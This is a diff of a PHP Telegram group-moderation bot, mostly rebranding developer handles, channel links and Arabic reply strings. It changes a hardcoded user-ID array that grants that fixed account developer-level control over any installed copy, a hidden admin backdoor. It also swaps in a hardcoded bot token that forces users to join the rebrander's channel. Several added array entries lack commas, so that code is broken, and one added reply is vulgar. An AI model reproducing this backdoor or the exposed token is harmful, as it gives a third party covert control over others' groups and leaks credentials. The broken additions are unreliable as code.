@@ -53,7 +53,7 @@ $mid = $message->message_id; $name2 = $update->callback_query->from->first_name;
 @$fromid = $update->callback_query->from->id;
 @$membercall = $update->callback_query->id;
 @$reply = $update->message->reply_to_message->forward_from->id;
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 @$data = $update->callback_query->data;
 @$messageid = $update->callback_query->message->message_id;
 @$tc = $update->message->chat->type;
@@ -62,7 +62,7 @@ $mid = $message->message_id; $name2 = $update->callback_query->from->first_name;
 /*===== dev ~ @FF8FFI =====*/
 $F_Uid = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChat?chat_id=$from_id"),true);
 $bio = $F_Uid['result']['bio'];
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 @$newchatmemberid = $update->message->new_chat_member->id;
 @$newchatmemberu = $update->message->new_chat_member->username;
 @$rt = $update->message->reply_to_message;
@@ -79,7 +79,7 @@ $bio = $F_Uid['result']['bio'];
 @$edit_for_id = $update->edited_message->from->id;
 @$edit_chatid = $update->callback_query->edited_message->chat->id;
 @$caption = $update->message->caption;
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 @$statjson = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$chat_id&user_id=".$from_id),true);
 @$status = $statjson['result']['status'];
 @$statjsonrt = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$chat_id&user_id=".$re_id),true);
@@ -90,7 +90,7 @@ $bio = $F_Uid['result']['bio'];
 @$you = $info['result']['status'];
 @$forchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=@".$channel."&user_id=".$from_id));
 @$tch = $forchannel->result->status;
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 $infos = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$chat_id&user_id=$idBot"), true);
 $bot = $infos['result']['status'];
 $can_bot_chang_info = $infos['result']['can_change_info'];
@@ -99,7 +99,7 @@ $can_bot_restrict = $infos['result']['can_restrict_members'];
 $can_bot_invite = $infos['result']['can_invite_users'];
 $can_bot_pin = $infos['result']['can_pin_messages'];
 $can_bot_promote = $infos['result']['can_promote_members'];
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 @$settings = json_decode(file_get_contents("data/$chat_id.json"),true);
 @$settings2 = json_decode(file_get_contents("data/$chatid.json"),true);
 @$editgetsettings = json_decode(file_get_contents("data/$chat_edit_id.json"),true);
@@ -125,7 +125,7 @@ $UserDevpe = json_decode(file_get_contents("http://api.telegram.org/bot$token/ge
 $NameDevpe = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$admin"))->result->first_name;
 $Dev = array("$admin","$From_Dev");
 $Dev = array("$admin","$From_Dev");
-$eri = array("1918338620", "1918338620" );
+$eri = array("5598689784", "5598689784" );
 $sudo = $admin;
 $DevUser = "@$UserDevpe";
 
@@ -179,7 +179,7 @@ if( $text=="/start" &&  $tc == "private" or $text=="⋄ رجوع" &&  $tc == "pr
 if(in_array($from_id,$Dev) or in_array($from_id,$eri)){
 bot('sendmessage',[
 'chat_id'=>$chat_id,
-'text'=>"💌╖اهلا بيك حبيبي [المطور](tg://user?id=$from_id)\n⚙️╢ تقدر تتحكم باوامر البوت عن طريق\n🔍╢ الكيبور اللي ظهرتلك تحت ↘️\n🔰╜ للدخول لقناة السورس دوس [هنا](t.me/FunctionCodee)",
+'text'=>"💌╖اهلا بيك حبيبي [المطور](tg://user?id=$from_id)\n⚙️╢ تقدر تتحكم باوامر البوت عن طريق\n🔍╢ الكيبور اللي ظهرتلك تحت ↘️\n🔰╜ للدخول لقناة السورس دوس [هنا](t.me/xx7fx)",
 'parse_mode'=>"markdown",
 'disable_web_page_preview'=>true,
 'reply_to_message_id'=>$message->message_id,
@@ -372,49 +372,49 @@ $developers_infos = file_get_contents("data/developers/developers.txt");
 $developers = explode("\n",$developers_infos);
 $list_developers ="";
 $list_developers = $list_developers.""."$developers_infos ➖➖➖➖➖➖➖";
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 $AUBEHABB_info = file_get_contents("data/AUBEHAB/AUBEHAB.txt");
 $AUBEHAB = explode ("\n",$AUBEHABB_info);
 $AUBEHABB_infos = file_get_contents("data/AUBEHAB/AUBEHABB.txt");
 $AUBEHABB = explode("\n",$AUBEHABB_infos);
 $list_AUBEHAB ="";
 $list_AUBEHAB = $list_AUBEHAB.""."$AUBEHABB_infos";
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 $nazarr_info = file_get_contents("data/nazar/$chat_id.txt");
 $nazar  = explode("\n",$nazarr_info);
 $nazarr_infos = file_get_contents("data/nazar/$chat_id/nazr.txt");
 $nazarr = explode ("\n",$nazarr_infos);
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 $LEGRs_info = file_get_contents("data/LEGR/$chat_id.txt");
 $LEGR  = explode("\n",$LEGRs_info);
 $LEGRs_infos = file_get_contents("data/LEGR/$chat_id/crlo.txt");
 $LEGRs = explode ("\n",$LEGRs_infos);
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 $mangers_info = file_get_contents("data/manger/$chat_id.txt");
 $manger  = explode("\n",$mangers_info);
 $mangers_infos = file_get_contents("data/manger/$chat_id/mange.txt");
 $mangers = explode ("\n",$mangers_infos);
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 $admin_users_info = file_get_contents("data/admin_user/$chat_id.txt");
 $admin_user  = explode("\n",$admin_users_info);
 $admin_users_infos = file_get_contents("data/admin_user/$chat_id/mange.txt");
 $admin_users = explode ("\n",$admin_users_infos);
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 $mmyazs_info = file_get_contents("data/mmyaz/$chat_id.txt");
 $mmyaz  = explode("\n",$mmyazs_info);
 $mmyazs_infos = file_get_contents("data/mmyaz/$chat_id/mange.txt");
 $mmyazs = explode ("\n",$mmyazs_infos);
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 $motay_info = file_get_contents("data/motay/$chat_id.txt");
 $motay  = explode("\n",$motay_info);
 $motaya_infos = file_get_contents("data/motay/$chat_id/mange.txt");
 $motaya = explode ("\n",$motaya_infos);
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 $bans = file_get_contents("data/ban/$chat_id.txt");
 $banids  = explode("\n",$bans);
 $banslist = file_get_contents("data/ban/$chat_id/list.txt");
 $banlist = explode ("\n",$banslist);
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 mkdir("data");
 mkdir("data/developers");
 mkdir("data/AUBEHAB");
@@ -436,8 +436,8 @@ mkdir("data/miss/$chat_id");
 mkdir("data/miss/$chat_id/miss.json");
 mkdir("statistics");
 
-$DRPP = "1903498836:AAFA1ai14owFsm8ugqRpEeqbnOhDZKrGeNA";
-$ckl = "@KKDRR"; 
+$DRPP = "6621338798:AAFbg9ckaf6bBxJY3y0Siy3YWgksklx48s4";
+$ckl = "@c9c99c"; 
 $ch2 = file_get_contents("https://api.telegram.org/bot$DRPP/getChatMember?chat_id=".$ckl."&user_id=".$from_id);
 $getch2 = json_decode(file_get_contents("http://api.telegram.org/bot$DRPP/getChat?chat_id=".$ckl))->result;
 $Namech2 = $getch2->title;
@@ -489,7 +489,7 @@ bot('sendMessage', [
 'text'=>"⋄︙بوت ← $namebot
 ⋄︙لحماية المجموعات من التخريب
 ⋄︙يتم حذف (الفشار،الاباحي،...)
-⋄︙البوت الاول علي التلجرام
+⋄︙البوت الاول على التلجرام
 ⋄︙قم برفعي كمشرف و ارسل ← تفعيل
 ⋄︙المطور ← [$DevUser]
 ",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
@@ -542,7 +542,7 @@ bot('sendmessage',[
 'reply_to_message_id'=>$message->message_id,
 ]);
 }
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 @$settings = json_decode(file_get_contents("data/$chat_id.json"),true);
 @$settings = json_decode(file_get_contents("data/$chat_id.json"),true);
 @$settings2 = json_decode(file_get_contents("data/$chatid.json"),true);
@@ -926,7 +926,7 @@ $settings = json_encode($settings,true);
 file_put_contents("data/$chat_id.json",$settings);
 }
 }
-/*===== dev ~ @FF8FFI =====*/
+/*===== dev ~ @c9c99c =====*/
 if($re and $text == "رفع مطور ثانوي" and $re_id !=$id_Bot and  in_array($from_id,$Dev) || in_array($from_id,$eri) and !in_array($re_id,$developer)){
 file_put_contents("data/developers/developer.txt",$re_id ."\n " , FILE_APPEND);
 file_put_contents("data/developers/developers.txt",'[@'.$re_user ."]". "\n " , FILE_APPEND);
@@ -6657,7 +6657,7 @@ if(in_array($from_id,$Dev)){
 if ($text == "⋄ حذف الاسم" or $text == "مسح اسم البوت"){
 file_put_contents("data/namebot.txt","ليجر");
 bot("sendMessage",["chat_id"=>$chat_id,'text'=>"⋄︙ تم مسح اسم البوت",'parse_mode'=>"MARKDOWN",'reply_to_message_id'=>$message_id,]);}}
-# --     Source LEGR     --
+# --     Source كبينه     --
 if($text && $setnamebot =="setnamebot" and in_array($from_id,$Dev)){
 file_put_contents("data/namebot.txt",$text); 
 file_put_contents("data/set.txt","");
@@ -6682,6 +6682,8 @@ $botre = array(
 "ياخي ورب اسمي $namebot",
 "حبي فدوه لصيح بوت اسمي $namebot",
 "اسمي $namebot حياتي"
+	"شتريد مو لحيت"
+	"عندي اسم تره😒"
 );
 $rebot = array_rand($botre, 1);
 if($text == "بوت" || $text == "البوت شنو اسمه" || $text == "شسمه البوت" || $text == "البوت شسمه" || $text == "اسم البوت" and $namebot != NULL){
@@ -6694,6 +6696,7 @@ $namere = array(
 "يمك حياتي امرني 🥺💞",
 "شتريد كل شويه $namebot",
 "يابه نجب كل شويه $namebot خبصتنه"
+"دكل خره كل شويه وكايل $namebot"
 );
 $rename = array_rand($namere, 1);
 if($text == "$namebot" and $namebot != NULL){
@@ -15797,5 +15800,5 @@ Open fun.php ...',
 'parse_mode'=>"HTML",'reply_to_message_id'=>$message_id,
  ]);
  } 
-# --     Source TIGER     --
+# --     Source كبينه     --
 echo "source bloodi";
